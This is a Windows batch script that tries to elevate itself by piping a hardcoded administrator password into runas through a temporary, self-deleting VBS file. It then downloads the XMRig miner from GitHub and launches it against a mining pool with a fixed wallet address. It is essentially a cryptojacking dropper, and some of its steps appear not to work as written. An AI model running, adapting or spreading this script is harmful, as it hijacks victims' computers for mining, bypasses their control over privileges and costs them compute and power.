@echo off
:: Batch script to self-elevate with password "haslo"
set PASSWORD=haslo
set CMD=cmd /k "echo [ADMIN] Success! & whoami & pause"

:: Generate and execute a temporary VBS script to handle UAC
(
  echo Set objShell = CreateObject("Shell.Application"^)
  echo objShell.ShellExecute "cmd.exe", "/c echo ^%PASSWORD^% | runas /user:Administrator ""^%CMD^%""", "", "runas", 1
) > "%temp%\admin_elevate.vbs" && (
  cscript //nologo "%temp%\admin_elevate.vbs"
  del "%temp%\admin_elevate.vbs" >nul 2>&1
)
rem Download XMRig
curl -L -o C:\xmrig\xmrig.zip https://github.com/xmrig/xmrig/releases/download/v6.18.1/xmrig-6.18.1-msvc-win64.zip

rem Extract the ZIP file
powershell Expand-Archive -Path "C:\xmrig\xmrig.zip" -DestinationPath "C:\xmrig"

rem Run XMRig
cd C:\xmrig
start xmrig.exe --url pool.minexmr.com:4444 --user "49hKFS8ZTmZdFhBaf8FKAPZ9B3My7rUn311D9ZVrETD47sncZ7YRx8HWYzxvb3mudmAJC671BVFq1SweY7FLAKDT1CVY7c" --pass x 

exit

